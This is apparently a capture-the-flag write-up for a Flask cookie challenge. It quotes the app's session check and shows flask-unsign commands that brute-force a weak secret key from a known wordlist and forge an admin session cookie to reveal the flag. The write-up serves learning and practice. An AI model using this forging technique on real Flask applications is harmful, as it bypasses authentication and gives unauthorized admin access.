So running the automation file tells that none of the cookies given to us provide the flag. We need to think something else (expected)

Reading the app source, this catches the eye

    if session.get("very_auth"):
                check = session["very_auth"] 
                if check == "admin":
                        resp = make_response(render_template("flag.html", value=flag_value, title=title))
                        return resp
We know that the app uses flask cookies, which store JSON data. This bit of code takes the value of the `very_auth` in the JSON stream and checks if that is equal to admin.

But if you enter a valid cookie name, very_auth is set to the cookie name instead,

        if "name" in request.form and request.form["name"] in cookie_names:
                resp = make_response(redirect("/display"))
                session["very_auth"] = request.form["name"]
                return resp
while an invalid name results in it being set to `blank`.

According to the code, very_auth is initially `blank` (which is required for it to passed to the /display directory), then the content is searched in valid cookie names and then the new value is decided.

If we can modify the cookie in the second stage, while putting a GET request to /display and change the value to `admin` we should be able to see the flag.

I used flask-unsign to decode the cookie JSON and find the secret key. We know the secret key is one of the cookie names and hence brute forcing is easy,

    app.secret_key = random.choice(cookie_names)

saving all the cookie names in a file `cookies.txt` (save them with quotations) and using flask-unsign

    flask-unsign --unsign --cookie '<cookie here>' -w cookies.txt
we get the decoded JSON and the secret key. Using the secret key we can modify the very_auth value,

    flask-unsign --sign --cookie "{'very_auth':'admin'}" --secret '<secret>'

passing this into the cookie header, we get the flag.
